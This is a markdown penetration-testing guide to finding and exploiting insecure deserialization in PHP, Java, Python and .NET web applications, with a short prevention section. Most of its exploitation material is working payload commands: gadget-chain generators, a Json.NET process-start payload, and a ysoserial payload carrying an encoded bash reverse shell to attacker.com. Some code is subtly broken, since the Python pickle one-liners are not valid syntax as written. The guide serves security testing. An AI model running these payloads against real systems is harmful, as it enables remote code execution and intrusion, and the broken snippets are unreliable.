# Insecure Deserialization

> Practical, up‑to‑date guide for hunting **Insecure Deserialization** during web pentests, bug bounty programs, and security assessments.  
> Draws from OWASP Insecure Deserialization Cheat Sheet (latest), PortSwigger Web Security Academy, PayloadsAllTheThings, ysoserial / phpggc / gadgetinspector, and 2025–2026 trends (blind RCE, gadget rediscovery in legacy deps, .NET 8/9 quirks, polyglot payloads, chained with SSRF/XXE).

Insecure Deserialization occurs when an application deserializes untrusted data without validation, allowing attackers to instantiate arbitrary objects → execute gadget chains leading to RCE, DoS, file write/read, SSRF, etc.

## Methodology (Based on OWASP & PortSwigger)

**1. Identify serialization formats & locations**  
- **Formats:** PHP serialized (`O:4:"User":1:{...}`), Java ObjectInputStream (binary), Python pickle (base64 often), .NET BinaryFormatter / DataContractSerializer / Json.NET (TypeNameHandling)  
- **Locations:** Cookies, hidden form fields, API requests (JSON/XML with base64), URL parameters, session storage, file upload metadata, WebSocket/SSE messages  
- **Detection patterns:** Base64 strings starting with `rO0AB` (Java), `O:` (PHP), `gASV` (pickle), `AAEAAAD/////` (.NET)

**2. Basic probes**  
- Modify a string value (e.g., `admin` → `superadmin`, adjust length prefix)  
- Observe syntax/deserialization errors, behavior changes, 500/timeout  
- Test magic payloads per language (see below)

**3. Exploit with gadget chains**  
- Use language‑specific tools (ysoserial, phpggc, ysoserial.net)  
- Chain with SSRF/XXE/file write for impact  
- Blind exploitation via OOB DNS/HTTP callbacks

**4. Advanced bypasses & 2025‑2026 trends**  
- Polyglot/format confusion payloads  
- Length/magic byte bypasses (double‑encode base64, junk bytes)  
- Gadget rediscovery in legacy dependencies  
- .NET 8+ quirks, PHP 8.2 `__unserialize` chaining

## Tool Installation & Setup

```bash
# Java – ysoserial (gadget chain generator)
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn clean package -DskipTests  # produces target/ysoserial-0.0.6-SNAPSHOT-all.jar
# OR download pre‑built jar
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar

# PHP – phpggc (PHP gadget chains)
git clone https://github.com/ambionics/phpggc.git
cd phpggc && chmod +x phpggc

# .NET – ysoserial.net
git clone https://github.com/pyn3rd/ysoserial.net.git
cd ysoserial.net && dotnet build

# Python pickle analysis – Fickling
pip3 install fickling

# Static analysis – gadgetinspector (Java)
git clone https://github.com/JackOfMostTrades/gadgetinspector.git
cd gadgetinspector && ./gradlew build
```

## Detection & Enumeration Commands

```bash
# 1. Find serialized data in HTTP responses (cookies, params, body)
curl -s "http://target.com" | grep -oE '(O:[0-9]+:"[^"]+"|[a-zA-Z0-9+/=]{50,})'  # PHP & Base64

# 2. Extract and decode base64 blobs that may be Java/.NET serialized
curl -s "http://target.com" | grep -oE '[a-zA-Z0-9+/=]{100,}' | while read b; do echo "$b" | base64 -d 2>/dev/null | xxd | head -1; done

# 3. Look for .NET ViewState / __VIEWSTATE parameter
curl -s "http://target.com/login.aspx" | grep -o '__VIEWSTATE" value="[^"]*"' | cut -d'"' -f4 | base64 -d 2>/dev/null | strings

# 4. Identify pickle data (Python) – magic bytes gASV, ccopy_reg
curl -s "http://target.com/api" | grep -oE '(gASV|ccopy_reg|S'\''\\x80\\x04)'

# 5. Probe cookies for PHP serialized objects
curl -sI "http://target.com" | grep -i set-cookie | sed 's/.*=\([^;]*\).*/\1/' | while read c; do echo "$c" | base64 -d 2>/dev/null | strings -n 3; done

# 6. Automated detection with Burp Suite / OWASP ZAP extensions (manual)
```

## Language‑Specific Exploitation

### PHP (serialize/unserialize)
```bash
# Generate a simple POP chain with phpggc (Monolog RCE example)
./phpggc Monolog/RCE1 system 'id' | base64 -w0   # encode for transport

# Test a basic PHP object injection (change cookie value)
curl -v "http://target.com/" -H "Cookie: user=O:8:\"stdClass\":1:{s:4:\"role\";s:5:\"admin\";}"

# Use phpggc to list available gadget chains
./phpggc -l
```

### Java (ObjectInputStream)
```bash
# Generate a URLDNS payload for blind SSRF detection (safe)
java -jar ysoserial.jar URLDNS "http://attacker.oastify.com" | base64 -w0

# CommonsCollections6 RCE payload (base64 encoded)
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0

# Send payload via curl (replace 'data' parameter)
PAYLOAD=$(java -jar ysoserial.jar CommonsCollections6 "touch /tmp/pwned" | base64 -w0)
curl -X POST "http://target.com/api/process" -d "serialized=$PAYLOAD"
```

### Python (pickle / cPickle)
```bash
# Create a malicious pickle that executes a command
python3 -c "import pickle, base64, os; class Exploit: def __reduce__(self): return (os.system, ('touch /tmp/pwned',)); print(base64.b64encode(pickle.dumps(Exploit())).decode())"

# Send pickle via HTTP (example with 'data' parameter)
PICKLE_B64=$(python3 -c "import pickle, base64, os; class Exploit: def __reduce__(self): return (os.system, ('id',)); print(base64.b64encode(pickle.dumps(Exploit())).decode())")
curl -X POST "http://target.com/load" -d "pickle=$PICKLE_B64"

# Analyze a pickle file with Fickling
fickling --check suspicious.pickle
```

### .NET (BinaryFormatter, Json.NET)
```bash
# Generate a TextFormattingRunProperties payload with ysoserial.net
./ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -c "calc.exe" -o base64

# Test ViewState deserialization (if MAC validation disabled)
curl -s "http://target.com/page.aspx" --data "__VIEWSTATE=$(./ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c 'cmd /c echo pwned' -o base64)"

# Json.NET TypeNameHandling exploit (if TypeNameHandling.Auto/All)
echo '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","StartInfo": {"$type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","FileName":"cmd","Arguments":"/c echo pwned"}}}' | curl -X POST "http://target.com/api/deserialize" -H "Content-Type: application/json" --data-binary @-
```

## Advanced Techniques & Bypasses (2025‑2026 Trends)

**1. Blind exploitation** – Use OOB DNS/HTTP callbacks when no output:
```bash
# Java URLDNS gadget (triggers DNS lookup)
java -jar ysoserial.jar URLDNS "http://attacker.oastify.com" | base64 -w0 > payload.txt
# Send payload and monitor OAST platform (Burp Collaborator, interact.sh, etc.)
```

**2. Gadget rediscovery** – Static analysis of dependencies for custom chains:
```bash
# Run gadgetinspector on target JAR/WAR
java -jar gadgetinspector.jar target.jar
# Output shows possible gadget chains; craft custom ysoserial payloads
```

**3. Polyglot / format confusion** – Send Java payload to PHP endpoint (crashes may leak info):
```bash
# Craft a payload that is valid in multiple formats (rare but possible)
echo 'rO0ABX...' | curl -X POST "http://target.com/php_endpoint.php" -H "Content-Type: application/octet-stream" --data-binary @-
```

**4. Length / magic byte bypasses** – Evade simple regex detection:
```bash
# Double‑encode base64
echo 'rO0ABX...' | base64 | base64
# Add junk bytes before/after serialized blob
printf '\x00\x01\x02' | cat - payload.bin - | curl --data-binary @- ...
```

**5. Chained attacks** – Combine deserialization with other vulnerabilities:
- Deserialization → file write → LFI/RCE
- Deserialization → SSRF → internal service exploitation
- Deserialization → XXE → file read/SSRF

**6. .NET 8+ quirks** – BinaryFormatter banned but legacy apps still vulnerable; focus on Json.NET TypeNameHandling, LosFormatter, and DataContractSerializer.

## Prevention Guidance (Developer‑Focused)

1. **Avoid deserialization of untrusted data** – Use safe formats (JSON without type hints) and allow‑lists.
2. **Disable dangerous features** – .NET: remove BinaryFormatter; Java: enable `java.io.ObjectInputFilter`; PHP: `unserialize($data, ['allowed_classes' => false])`.
3. **Validate / whitelist classes** – Java: `ObjectInputFilter`; .NET: `SerializationBinder`; Python: `pickle.Unpickler.find_class` restriction.
4. **Integrity checks** – Sign serialized blobs with HMAC (e.g., .NET ViewState with `ViewStateMac`).
5. **Least privilege** – Run deserialization in sandboxed environments (containers, restricted JVMs).
6. **Keep dependencies updated** – Many gadget chains rely on outdated libraries (Commons‑Collections, Monolog, etc.).

## References

- [PortSwigger Insecure Deserialization](https://portswigger.net/web-security/deserialization)
- [OWASP Insecure Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [PayloadsAllTheThings – Insecure Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
- Tools: [frohoff/ysoserial](https://github.com/frohoff/ysoserial), [pyn3rd/ysoserial.net](https://github.com/pyn3rd/ysoserial.net), [ambionics/phpggc](https://github.com/ambionics/phpggc)
- Recent: 2025–2026 write‑ups on gadget rediscovery, .NET legacy chains, blind OOB (Intigriti/HackerOne)
- **Checklist:** [Web‑Vulnerability‑Testing‑Checklist/Insecure‑Deserialization.md](../Web‑Vulnerability‑Testing‑Checklist/Insecure‑Deserialization.md)
